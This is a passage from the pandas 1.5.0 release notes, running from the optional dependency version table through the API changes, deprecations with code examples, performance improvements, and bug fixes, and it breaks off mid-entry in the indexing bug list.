      |         |\n+-----------------+-----------------+---------+\n| hypothesis      |6.13.0           |    X    |\n+-----------------+-----------------+---------+\n| gcsfs           |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| jinja2          |3.0.0            |    X    |\n+-----------------+-----------------+---------+\n| lxml            |4.6.3            |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      |3.3.2            |         |\n+-----------------+-----------------+---------+\n| numba           |0.53.1           |    X    |\n+-----------------+-----------------+---------+\n| numexpr         |2.7.3            |    X    |\n+-----------------+-----------------+---------+\n| odfpy           |1.4.1            |         |\n+-----------------+-----------------+---------+\n| openpyxl        |3.0.7            |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      |0.15.0           |    X    |\n+-----------------+-----------------+---------+\n| psycopg2        |2.8.6            |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         |1.0.1            |         |\n+-----------------+-----------------+---------+\n| pymysql         |1.0.2            |    X    |\n+-----------------+-----------------+---------+\n| pyreadstat      |1.1.2            |    X    |\n+-----------------+-----------------+---------+\n| pytables        |3.6.1            |         |\n+-----------------+-----------------+---------+\n| python-snappy   |0.6.0            |         |\n+-----------------+-----------------+---------+\n| pyxlsb          |1.0.8            |    X    |\n+-----------------+-----------------+---------+\n| s3fs            |2021.08.0        |    X    |\n+-----------------+-----------------+---------+\n| scipy           |1.7.1            |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      |1.4.16           |    X    |\n+-----------------+-----------------+---------+\n| tabulate        |0.8.9            |    X    |\n+-----------------+-----------------+---------+\n| tzdata          |2022a            |         |\n+-----------------+-----------------+---------+\n| xarray          |0.19.0           |    X    |\n+-----------------+-----------------+---------+\n| xlrd            |2.0.1            |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      |1.4.3            |    X    |\n+-----------------+-----------------+---------+\n| xlwt            |1.3.0            |         |\n+-----------------+-----------------+---------+\n| zstandard       |0.15.2           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_150.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n\n- BigQuery I/O methods :func:`read_gbq` and :meth:`DataFrame.to_gbq` default to\n  ``auth_local_webserver = True``. Google has deprecated the\n  ``auth_local_webserver = False`` `\"out of band\" (copy-paste) flow\n  <https://developers.googleblog.com/2022/02/making-oauth-flows-safer.html?m=1#disallowed-oob>`_.\n  The ``auth_local_webserver = False`` option is planned to stop working in\n  October 2022. (:issue:`46312`)\n- :func:`read_json` now raises ``FileNotFoundError`` (previously ``ValueError``) when input is a string ending in ``.json``, ``.json.gz``, ``.json.bz2``, etc. but no such file exists. (:issue:`29102`)\n- Operations with :class:`Timestamp` or :class:`Timedelta` that would previously raise ``OverflowError`` instead raise ``OutOfBoundsDatetime`` or ``OutOfBoundsTimedelta`` where appropriate (:issue:`47268`)\n- When :func:`read_sas` previously returned ``None``, it now returns an empty :class:`DataFrame` (:issue:`47410`)\n- :class:`DataFrame` constructor raises if ``index`` or ``columns`` arguments are sets (:issue:`47215`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. warning::\n\n    In the next major version release, 2.0, several larger API changes are being considered without a formal deprecation such as\n    making the standard library `zoneinfo <https://docs.python.org/3/library/zoneinfo.html>`_ the default timezone implementation instead of ``pytz``,\n    having the :class:`Index` support all data types instead of having multiple subclasses (:class:`CategoricalIndex`, :class:`Int64Index`, etc.), and more.\n    The changes under consideration are logged in `this GitHub issue <https://github.com/pandas-dev/pandas/issues/44823>`_, and any\n    feedback or concerns are welcome.\n\n.. _whatsnew_150.deprecations.int_slicing_series:\n\nLabel-based integer slicing on a Series with an Int64Index or RangeIndex\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn a future version, integer slicing on a :class:`Series` with a :class:`Int64Index` or :class:`RangeIndex` will be treated as *label-based*, not positional. This will make the behavior consistent with other :meth:`Series.__getitem__` and :meth:`Series.__setitem__` behaviors (:issue:`45162`).\n\nFor example:\n\n.. ipython:: python\n\n   ser = pd.Series([1, 2, 3, 4, 5], index=[2, 3, 5, 7, 11])\n\nIn the old behavior, ``ser[2:4]`` treats the slice as positional:\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: ser[2:4]\n    Out[3]:\n    5    3\n    7    4\n    dtype: int64\n\nIn a future version, this will be treated as label-based:\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [4]: ser.loc[2:4]\n    Out[4]:\n    2    1\n    3    2\n    dtype: int64\n\nTo retain the old behavior, use ``series.iloc[i:j]``. To get the future behavior,\nuse ``series.loc[i:j]``.\n\nSlicing on a :class:`DataFrame` will not be affected.\n\n.. _whatsnew_150.deprecations.excel_writer_attributes:\n\n:class:`ExcelWriter` attributes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAll attributes of :class:`ExcelWriter` were previously documented as not\npublic. However some third party Excel engines documented accessing\n``ExcelWriter.book`` or ``ExcelWriter.sheets``, and users were utilizing these\nand possibly other attributes. Previously these attributes were not safe to use;\ne.g. modifications to ``ExcelWriter.book`` would not update ``ExcelWriter.sheets``\nand conversely. In order to support this, pandas has made some attributes public\nand improved their implementations so that they may now be safely used. (:issue:`45572`)\n\nThe following attributes are now public and considered safe to access.\n\n - ``book``\n - ``check_extension``\n - ``close``\n - ``date_format``\n - ``datetime_format``\n - ``engine``\n - ``if_sheet_exists``\n - ``sheets``\n - ``supported_extensions``\n\nThe following attributes have been deprecated. They now raise a ``FutureWarning``\nwhen accessed and will be removed in a future version. Users should be aware\nthat their usage is considered unsafe, and can lead to unexpected results.\n\n - ``cur_sheet``\n - ``handles``\n - ``path``\n - ``save``\n - ``write_cells``\n\nSee the documentation of :class:`ExcelWriter` for further details.\n\n.. _whatsnew_150.deprecations.group_keys_in_apply:\n\nUsing ``group_keys`` with transformers in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn previous versions of pandas, if it was inferred that the function passed to\n:meth:`.DataFrameGroupBy.apply` or :meth:`.SeriesGroupBy.apply` was a transformer (i.e. the resulting index was equal to\nthe input index), the ``group_keys`` argument of :meth:`DataFrame.groupby` and\n:meth:`Series.groupby` was ignored and the group keys would never be added to\nthe index of the result. In the future, the group keys will be added to the index\nwhen the user specifies ``group_keys=True``.\n\nAs ``group_keys=True`` is the default value of :meth:`DataFrame.groupby` and\n:meth:`Series.groupby`, not specifying ``group_keys`` with a transformer will\nraise a ``FutureWarning``. This can be silenced and the previous behavior\nretained by specifying ``group_keys=False``.\n\n.. _whatsnew_150.deprecations.setitem_column_try_inplace:\n   _ see also _whatsnew_130.notable_bug_fixes.setitem_column_try_inplace\n\nInplace operation when setting values with ``loc`` and ``iloc``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nMost of the time setting values with :meth:`DataFrame.iloc` attempts to set values\ninplace, only falling back to inserting a new array if necessary. There are\nsome cases where this rule is not followed, for example when setting an entire\ncolumn from an array with different dtype:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'price': [11.1, 12.2]}, index=['book1', 'book2'])\n   original_prices = df['price']\n   new_prices = np.array([98, 99])\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.iloc[:, 0] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]:\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: price, float: 64\n\nThis behavior is deprecated. In a future version, setting an entire column with\niloc will attempt to operate inplace.\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.iloc[:, 0] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]:\n    book1    98.0\n    book2    99.0\n    Name: price, dtype: float64\n    In [5]: original_prices\n    Out[5]:\n    book1    98.0\n    book2    99.0\n    Name: price, dtype: float64\n\nTo get the old behavior, use :meth:`DataFrame.__setitem__` directly:\n\n.. code-block:: ipython\n\n    In [3]: df[df.columns[0]] = new_prices\n    In [4]: df.iloc[:, 0]\n    Out[4]\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: price, dtype: float64\n\nTo get the old behaviour when ``df.columns`` is not unique and you want to\nchange a single column by index, you can use :meth:`DataFrame.isetitem`, which\nhas been added in pandas 1.5:\n\n.. code-block:: ipython\n\n    In [3]: df_with_duplicated_cols = pd.concat([df, df], axis='columns')\n    In [3]: df_with_duplicated_cols.isetitem(0, new_prices)\n    In [4]: df_with_duplicated_cols.iloc[:, 0]\n    Out[4]:\n    book1    98\n    book2    99\n    Name: price, dtype: int64\n    In [5]: original_prices\n    Out[5]:\n    book1    11.1\n    book2    12.2\n    Name: 0, dtype: float64\n\n.. _whatsnew_150.deprecations.numeric_only_default:\n\n``numeric_only`` default value\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAcross the :class:`DataFrame`, :class:`.DataFrameGroupBy`, and :class:`.Resampler` operations such as\n``min``, ``sum``, and ``idxmax``, the default\nvalue of the ``numeric_only`` argument, if it exists at all, was inconsistent.\nFurthermore, operations with the default value ``None`` can lead to surprising\nresults. (:issue:`46560`)\n\n.. code-block:: ipython\n\n    In [1]: df = pd.DataFrame({\"a\": [1, 2], \"b\": [\"x\", \"y\"]})\n\n    In [2]: # Reading the next line without knowing the contents of df, one would\n            # expect the result to contain the products for both columns a and b.\n            df[[\"a\", \"b\"]].prod()\n    Out[2]:\n    a    2\n    dtype: int64\n\nTo avoid this behavior, the specifying the value ``numeric_only=None`` has been\ndeprecated, and will be removed in a future version of pandas. In the future,\nall operations with a ``numeric_only`` argument will default to ``False``. Users\nshould either call the operation only with columns that can be operated on, or\nspecify ``numeric_only=True`` to operate only on Boolean, integer, and float columns.\n\nIn order to support the transition to the new behavior, the following methods have\ngained the ``numeric_only`` argument.\n\n- :meth:`DataFrame.corr`\n- :meth:`DataFrame.corrwith`\n- :meth:`DataFrame.cov`\n- :meth:`DataFrame.idxmin`\n- :meth:`DataFrame.idxmax`\n- :meth:`.DataFrameGroupBy.cummin`\n- :meth:`.DataFrameGroupBy.cummax`\n- :meth:`.DataFrameGroupBy.idxmin`\n- :meth:`.DataFrameGroupBy.idxmax`\n- :meth:`.DataFrameGroupBy.var`\n- :meth:`.DataFrameGroupBy.std`\n- :meth:`.DataFrameGroupBy.sem`\n- :meth:`.DataFrameGroupBy.quantile`\n- :meth:`.Resampler.mean`\n- :meth:`.Resampler.median`\n- :meth:`.Resampler.sem`\n- :meth:`.Resampler.std`\n- :meth:`.Resampler.var`\n- :meth:`DataFrame.rolling` operations\n- :meth:`DataFrame.expanding` operations\n- :meth:`DataFrame.ewm` operations\n\n.. _whatsnew_150.deprecations.other:\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated the keyword ``line_terminator`` in :meth:`DataFrame.to_csv` and :meth:`Series.to_csv`, use ``lineterminator`` instead; this is for consistency with :func:`read_csv` and the standard library 'csv' module (:issue:`9568`)\n- Deprecated behavior of :meth:`SparseArray.astype`, :meth:`Series.astype`, and :meth:`DataFrame.astype` with :class:`SparseDtype` when passing a non-sparse ``dtype``. In a future version, this will cast to that non-sparse dtype instead of wrapping it in a :class:`SparseDtype` (:issue:`34457`)\n- Deprecated behavior of :meth:`DatetimeIndex.intersection` and :meth:`DatetimeIndex.symmetric_difference` (``union`` behavior was already deprecated in version 1.3.0) with mixed time zones; in a future version both will be cast to UTC instead of object dtype (:issue:`39328`, :issue:`45357`)\n- Deprecated :meth:`DataFrame.iteritems`, :meth:`Series.iteritems`, :meth:`HDFStore.iteritems` in favor of :meth:`DataFrame.items`, :meth:`Series.items`, :meth:`HDFStore.items`  (:issue:`45321`)\n- Deprecated :meth:`Series.is_monotonic` and :meth:`Index.is_monotonic` in favor of :meth:`Series.is_monotonic_increasing` and :meth:`Index.is_monotonic_increasing` (:issue:`45422`, :issue:`21335`)\n- Deprecated behavior of :meth:`DatetimeIndex.astype`, :meth:`TimedeltaIndex.astype`, :meth:`PeriodIndex.astype` when converting to an integer dtype other than ``int64``. In a future version, these will convert to exactly the specified dtype (instead of always ``int64``) and will raise if the conversion overflows (:issue:`45034`)\n- Deprecated the ``__array_wrap__`` method of DataFrame and Series, rely on standard numpy ufuncs instead (:issue:`45451`)\n- Deprecated treating float-dtype data as wall-times when passed with a timezone to :class:`Series` or :class:`DatetimeIndex` (:issue:`45573`)\n- Deprecated the behavior of :meth:`Series.fillna` and :meth:`DataFrame.fillna` with ``timedelta64[ns]`` dtype and incompatible fill value; in a future version this will cast to a common dtype (usually object) instead of raising, matching the behavior of other dtypes (:issue:`45746`)\n- Deprecated the ``warn`` parameter in :func:`infer_freq` (:issue:`45947`)\n- Deprecated allowing non-keyword arguments in :meth:`.ExtensionArray.argsort` (:issue:`46134`)\n- Deprecated treating all-bool ``object``-dtype columns as bool-like in :meth:`DataFrame.any` and :meth:`DataFrame.all` with ``bool_only=True``, explicitly cast to bool instead (:issue:`46188`)\n- Deprecated behavior of method :meth:`DataFrame.quantile`, attribute ``numeric_only`` will default False. Including datetime/timedelta columns in the result (:issue:`7308`).\n- Deprecated :attr:`Timedelta.freq` and :attr:`Timedelta.is_populated` (:issue:`46430`)\n- Deprecated :attr:`Timedelta.delta` (:issue:`46476`)\n- Deprecated passing arguments as positional in :meth:`DataFrame.any` and :meth:`Series.any` (:issue:`44802`)\n- Deprecated passing positional arguments to :meth:`DataFrame.pivot` and :func:`pivot` except ``data`` (:issue:`30228`)\n- Deprecated the methods :meth:`DataFrame.mad`, :meth:`Series.mad`, and the corresponding groupby methods (:issue:`11787`)\n- Deprecated positional arguments to :meth:`Index.join` except for ``other``, use keyword-only arguments instead of positional arguments (:issue:`46518`)\n- Deprecated positional arguments to :meth:`StringMethods.rsplit` and :meth:`StringMethods.split` except for ``pat``, use keyword-only arguments instead of positional arguments (:issue:`47423`)\n- Deprecated indexing on a timezone-naive :class:`DatetimeIndex` using a string representing a timezone-aware datetime (:issue:`46903`, :issue:`36148`)\n- Deprecated allowing ``unit=\"M\"`` or ``unit=\"Y\"`` in :class:`Timestamp` constructor with a non-round float value (:issue:`47267`)\n- Deprecated the ``display.column_space`` global configuration option (:issue:`7576`)\n- Deprecated the argument ``na_sentinel`` in :func:`factorize`, :meth:`Index.factorize`, and :meth:`.ExtensionArray.factorize`; pass ``use_na_sentinel=True`` instead to use the sentinel ``-1`` for NaN values and ``use_na_sentinel=False`` instead of ``na_sentinel=None`` to encode NaN values (:issue:`46910`)\n- Deprecated :meth:`.DataFrameGroupBy.transform` not aligning the result when the UDF returned DataFrame (:issue:`45648`)\n- Clarified warning from :func:`to_datetime` when delimited dates can't be parsed in accordance to specified ``dayfirst`` argument (:issue:`46210`)\n- Emit warning from :func:`to_datetime` when delimited dates can't be parsed in accordance to specified ``dayfirst`` argument even for dates where leading zero is omitted (e.g. ``31/1/2001``) (:issue:`47880`)\n- Deprecated :class:`Series` and :class:`Resampler` reducers (e.g. ``min``, ``max``, ``sum``, ``mean``) raising a ``NotImplementedError`` when the dtype is non-numric and ``numeric_only=True`` is provided; this will raise a ``TypeError`` in a future version (:issue:`47500`)\n- Deprecated :meth:`Series.rank` returning an empty result when the dtype is non-numeric and ``numeric_only=True`` is provided; this will raise a ``TypeError`` in a future version (:issue:`47500`)\n- Deprecated argument ``errors`` for :meth:`Series.mask`, :meth:`Series.where`, :meth:`DataFrame.mask`, and :meth:`DataFrame.where` as ``errors`` had no effect on this methods (:issue:`47728`)\n- Deprecated arguments ``*args`` and ``**kwargs`` in :class:`Rolling`, :class:`Expanding`, and :class:`ExponentialMovingWindow` ops. (:issue:`47836`)\n- Deprecated the ``inplace`` keyword in :meth:`Categorical.set_ordered`, :meth:`Categorical.as_ordered`, and :meth:`Categorical.as_unordered` (:issue:`37643`)\n- Deprecated setting a categorical's categories with ``cat.categories = ['a', 'b', 'c']``, use :meth:`Categorical.rename_categories` instead (:issue:`37643`)\n- Deprecated unused arguments ``encoding`` and ``verbose`` in :meth:`Series.to_excel` and :meth:`DataFrame.to_excel` (:issue:`47912`)\n- Deprecated the ``inplace`` keyword in :meth:`DataFrame.set_axis` and :meth:`Series.set_axis`, use ``obj = obj.set_axis(..., copy=False)`` instead (:issue:`48130`)\n- Deprecated producing a single element when iterating over a :class:`DataFrameGroupBy` or a :class:`SeriesGroupBy` that has been grouped by a list of length 1; A tuple of length one will be returned instead (:issue:`42795`)\n- Fixed up warning message of deprecation of :meth:`MultiIndex.lesort_depth` as public method, as the message previously referred to :meth:`MultiIndex.is_lexsorted` instead (:issue:`38701`)\n- Deprecated the ``sort_columns`` argument in :meth:`DataFrame.plot` and :meth:`Series.plot` (:issue:`47563`).\n- Deprecated positional arguments for all but the first argument of :meth:`DataFrame.to_stata` and :func:`read_stata`, use keyword arguments instead (:issue:`48128`).\n- Deprecated the ``mangle_dupe_cols`` argument in :func:`read_csv`, :func:`read_fwf`, :func:`read_table` and :func:`read_excel`. The argument was never implemented, and a new argument where the renaming pattern can be specified will be added instead (:issue:`47718`)\n- Deprecated allowing ``dtype='datetime64'`` or ``dtype=np.datetime64`` in :meth:`Series.astype`, use \"datetime64[ns]\" instead (:issue:`47844`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`DataFrame.corrwith` for column-wise (axis=0) Pearson and Spearman correlation when other is a :class:`Series` (:issue:`46174`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` for some user-defined DataFrame -> Series functions (:issue:`45387`)\n- Performance improvement in :meth:`DataFrame.duplicated` when subset consists of only one column (:issue:`45236`)\n- Performance improvement in :meth:`.DataFrameGroupBy.diff` and :meth:`.SeriesGroupBy.diff` (:issue:`16706`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` when broadcasting values for user-defined functions (:issue:`45708`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` for user-defined functions when only a single group exists (:issue:`44977`)\n- Performance improvement in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` when grouping on a non-unique unsorted index (:issue:`46527`)\n- Performance improvement in :meth:`DataFrame.loc` and :meth:`Series.loc` for tuple-based indexing of a :class:`MultiIndex` (:issue:`45681`, :issue:`46040`, :issue:`46330`)\n- Performance improvement in :meth:`.DataFrameGroupBy.var` and :meth:`.SeriesGroupBy.var` with ``ddof`` other than one (:issue:`48152`)\n- Performance improvement in :meth:`DataFrame.to_records` when the index is a :class:`MultiIndex` (:issue:`47263`)\n- Performance improvement in :attr:`MultiIndex.values` when the MultiIndex contains levels of type DatetimeIndex, TimedeltaIndex or ExtensionDtypes (:issue:`46288`)\n- Performance improvement in :func:`merge` when left and/or right are empty (:issue:`45838`)\n- Performance improvement in :meth:`DataFrame.join` when left and/or right are empty (:issue:`46015`)\n- Performance improvement in :meth:`DataFrame.reindex` and :meth:`Series.reindex` when target is a :class:`MultiIndex` (:issue:`46235`)\n- Performance improvement when setting values in a pyarrow backed string array (:issue:`46400`)\n- Performance improvement in :func:`factorize` (:issue:`46109`)\n- Performance improvement in :class:`DataFrame` and :class:`Series` constructors for extension dtype scalars (:issue:`45854`)\n- Performance improvement in :func:`read_excel` when ``nrows`` argument provided (:issue:`32727`)\n- Performance improvement in :meth:`.Styler.to_excel` when applying repeated CSS formats (:issue:`47371`)\n- Performance improvement in :meth:`MultiIndex.is_monotonic_increasing`  (:issue:`47458`)\n- Performance improvement in :class:`BusinessHour` ``str`` and ``repr`` (:issue:`44764`)\n- Performance improvement in datetime arrays string formatting when one of the default strftime formats ``\"%Y-%m-%d %H:%M:%S\"`` or ``\"%Y-%m-%d %H:%M:%S.%f\"`` is used. (:issue:`44764`)\n- Performance improvement in :meth:`Series.to_sql` and :meth:`DataFrame.to_sql` (:class:`SQLiteTable`) when processing time arrays. (:issue:`44764`)\n- Performance improvement to :func:`read_sas` (:issue:`47404`)\n- Performance improvement in ``argmax`` and ``argmin`` for :class:`arrays.SparseArray` (:issue:`34197`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :meth:`.Categorical.view` not accepting integer dtypes (:issue:`25464`)\n- Bug in :meth:`.CategoricalIndex.union` when the index's categories are integer-dtype and the index contains ``NaN`` values incorrectly raising instead of casting to ``float64`` (:issue:`45362`)\n- Bug in :meth:`concat` when concatenating two (or more) unordered :class:`CategoricalIndex` variables, whose categories are permutations, yields incorrect index values (:issue:`24845`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :meth:`DataFrame.quantile` with datetime-like dtypes and no rows incorrectly returning ``float64`` dtype instead of retaining datetime-like dtype (:issue:`41544`)\n- Bug in :func:`to_datetime` with sequences of ``np.str_`` objects incorrectly raising (:issue:`32264`)\n- Bug in :class:`Timestamp` construction when passing datetime components as positional arguments and ``tzinfo`` as a keyword argument incorrectly raising (:issue:`31929`)\n- Bug in :meth:`Index.astype` when casting from object dtype to ``timedelta64[ns]`` dtype incorrectly casting ``np.datetime64(\"NaT\")`` values to ``np.timedelta64(\"NaT\")`` instead of raising (:issue:`45722`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` index when passing categorical column (:issue:`44324`)\n- Bug in :meth:`DatetimeIndex.tz_localize` localizing to UTC failing to make a copy of the underlying data (:issue:`46460`)\n- Bug in :meth:`DatetimeIndex.resolution` incorrectly returning \"day\" instead of \"nanosecond\" for nanosecond-resolution indexes (:issue:`46903`)\n- Bug in :class:`Timestamp` with an integer or float value and ``unit=\"Y\"`` or ``unit=\"M\"`` giving slightly-wrong results (:issue:`47266`)\n- Bug in :class:`.DatetimeArray` construction when passed another :class:`.DatetimeArray` and ``freq=None`` incorrectly inferring the freq from the given array (:issue:`47296`)\n- Bug in :func:`to_datetime` where ``OutOfBoundsDatetime`` would be thrown even if ``errors=coerce`` if there were more than 50 rows (:issue:`45319`)\n- Bug when adding a :class:`DateOffset` to a :class:`Series` would not add the ``nanoseconds`` field (:issue:`47856`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :func:`astype_nansafe` astype(\"timedelta64[ns]\") fails when np.nan is included (:issue:`45798`)\n- Bug in constructing a :class:`Timedelta` with a ``np.timedelta64`` object and a ``unit`` sometimes silently overflowing and returning incorrect results instead of raising ``OutOfBoundsTimedelta`` (:issue:`46827`)\n- Bug in constructing a :class:`Timedelta` from a large integer or float with ``unit=\"W\"`` silently overflowing and returning incorrect results instead of raising ``OutOfBoundsTimedelta`` (:issue:`47268`)\n\nTime Zones\n^^^^^^^^^^\n- Bug in :class:`Timestamp` constructor raising when passed a ``ZoneInfo`` tzinfo object (:issue:`46425`)\n\nNumeric\n^^^^^^^\n- Bug in operations with array-likes with ``dtype=\"boolean\"`` and :attr:`NA` incorrectly altering the array in-place (:issue:`45421`)\n- Bug in arithmetic operations with nullable types without :attr:`NA` values not matching the same operation with non-nullable types (:issue:`48223`)\n- Bug in ``floordiv`` when dividing by ``IntegerDtype`` ``0`` would return ``0`` instead of ``inf`` (:issue:`48223`)\n- Bug in division, ``pow`` and ``mod`` operations on array-likes with ``dtype=\"boolean\"`` not being like their ``np.bool_`` counterparts (:issue:`46063`)\n- Bug in multiplying a :class:`Series` with ``IntegerDtype`` or ``FloatingDtype`` by an array-like with ``timedelta64[ns]`` dtype incorrectly raising (:issue:`45622`)\n- Bug in :meth:`mean` where the optional dependency ``bottleneck`` causes precision loss linear in the length of the array. ``bottleneck`` has been disabled for :meth:`mean` improving the loss to log-linear but may result in a performance decrease. (:issue:`42878`)\n\nConversion\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.astype` not preserving subclasses (:issue:`40810`)\n- Bug in constructing a :class:`Series` from a float-containing list or a floating-dtype ndarray-like (e.g. ``dask.Array``) and an integer dtype raising instead of casting like we would with an ``np.ndarray`` (:issue:`40110`)\n- Bug in :meth:`Float64Index.astype` to unsigned integer dtype incorrectly casting to ``np.int64`` dtype (:issue:`45309`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` from floating dtype to unsigned integer dtype failing to raise in the presence of negative values (:issue:`45151`)\n- Bug in :func:`array` with ``FloatingDtype`` and values containing float-castable strings incorrectly raising (:issue:`45424`)\n- Bug when comparing string and datetime64ns objects causing ``OverflowError`` exception. (:issue:`45506`)\n- Bug in metaclass of generic abstract dtypes causing :meth:`DataFrame.apply` and :meth:`Series.apply` to raise for the built-in function ``type`` (:issue:`46684`)\n- Bug in :meth:`DataFrame.to_records` returning inconsistent numpy types if the index was a :class:`MultiIndex` (:issue:`47263`)\n- Bug in :meth:`DataFrame.to_dict` for ``orient=\"list\"`` or ``orient=\"index\"`` was not returning native types (:issue:`46751`)\n- Bug in :meth:`DataFrame.apply` that returns a :class:`DataFrame` instead of a :class:`Series` when applied to an empty :class:`DataFrame` and ``axis=1`` (:issue:`39111`)\n- Bug when inferring the dtype from an iterable that is *not* a NumPy ``ndarray`` consisting of all NumPy unsigned integer scalars did not result in an unsigned integer dtype (:issue:`47294`)\n- Bug in :meth:`DataFrame.eval` when pandas objects (e.g. ``'Timestamp'``) were column names (:issue:`44603`)\n\nStrings\n^^^^^^^\n- Bug in :meth:`str.startswith` and :meth:`str.endswith` when using other series as parameter _pat_. Now raises ``TypeError`` (:issue:`3485`)\n- Bug in :meth:`Series.str.zfill` when strings contain leading signs, padding '0' before the sign character rather than after as ``str.zfill`` from standard library (:issue:`20868`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`IntervalArray.__setitem__` when setting ``np.nan`` into an integer-backed array raising ``ValueError`` instead of ``TypeError`` (:issue:`45484`)\n- Bug in :class:`IntervalDtype` when using datetime64[ns, tz] as a dtype string (:issue:`46999`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.iloc` where indexing a single row on a :class:`DataFrame` with a single ExtensionDtype column gave a copy instead of a view on the underlying data (:issue:`45241`)\n- Bug in :meth:`DataFrame.__getitem__` returning copy when :class:`DataFrame` has duplicated columns even if a unique column is selected (:issue:`45316`, :issue:`41062`)\n- Bug in :meth:`Series.align` does not create :class:`MultiIndex` with union of levels when both MultiIndexes intersections are identical (:issue:`45224`)\n- Bug in setting a NA value (``None`` or ``np.nan``) into a :class:`Series` with int-based :class:`IntervalDtype` incorrectly casting to object dtype instead of a float-based :class:`IntervalDtype` (:issue:`45568`)\n- Bug in indexing setting values into an ``ExtensionDtype`` column with ``df.iloc[:, i] = values`` with ``values`` having the same dtype as ``df.iloc[:, i]`` incorrectly inserting a new array instead of setting in-place (:issue:`33457`)\n- Bug in :meth:`Series.__setitem__` with a non-integer :class:`Index` when using an integer key to set a value that cannot be set inplace where a ``ValueError`` was raised instead of casting to a common dtype (:issue:`45070`)\n- Bug in :meth:`DataFrame.loc` not casting ``None`` to ``NA`` when setting value as a list into :class:`DataFrame` (:issue:`47987`)\n- Bug in :meth:`Series.__setitem__` when setting incompatible values into a ``PeriodDtype`` or ``IntervalDtype`` :class:`Series` raising when indexing with a boolean mask but coercing when indexing with otherwise-equivalent indexers; these now consistently coerce, along with :meth:`Series.mask` and :meth:`Series.where` (:issue:`45768`)\n- Bug in :meth:`DataFrame.where` with multiple columns with datetime-like dtypes failing to downcast results consistent with other dtypes (:issue:`45837`)\n- Bug in :func:`isin` upcasting to ``float64`` with unsigned integer dtype and list-like argument without a dtype (:issue:`46485`)\n- Bug in :meth:`Series.loc.__setitem__` and :meth:`Series.loc.__getitem__` not raising when using multiple keys without using a :class:`MultiIndex` (:issue:`13831`)\n- Bug in :meth:`Index.reindex` raising ``AssertionError`` when ``level`` was specified but no :class:`MultiIndex` was given; level is ignored now (:issue:`35132`)\n- Bug when setting a value too large for a :class:`Series` dtype failing to coerce to a common type (:issue:`26049`, :issue:`32878`)\n- Bug in :meth:`loc.__setitem__` treating ``range`` keys as positional instead of label-based (:issue:`45479`)\n- Bug in :meth:`DataFrame.__setitem__` casting extension array dtypes to object when setting with a scalar key and :class:`DataFrame` as value (:issue:`46896`)\n- Bug in :meth:`Series.__setitem__` when setting a scalar to a nullable pandas dtype would not raise a ``TypeError`` if the scalar could not be cast (losslessly) to the nullable type (:issue:`45404`)\n- Bug in :meth:`Series.__setitem__` when setting ``boolean`` dtype values containing ``NA`` incorrectly raising instead of casting to ``boolean`` dtype (:issue:`45462`)\n- Bug in :meth:`Series.loc` raising with boolean indexer containing ``NA`` when :class:`Index` did not match (:issue:`46551`)\n- Bug in :meth:`Series.__setitem__` where setting :attr:`NA` into a numeric-dtype :class:`Series` would incorrectly upcast to object-dtype rather than treating the value as ``np.nan`` (:issue:`44199`)\n- Bug in :meth:`DataFrame.loc` when setting values to a column and right hand side is a dictionary (:issue:`47216`)\n- Bug in :meth:`Series.__setitem__` with ``datetime64[ns]`` dtype, an all-``False`` boolean mask, and an incompatible value incorrectly casting to ``object`` instead of retaining ``datetime64[ns]`` dtype (:issue:`45967`)\n- Bug in :meth:`Index.__getitem__`  raising ``ValueError`` when indexer is from boolean dtype with ``NA`` 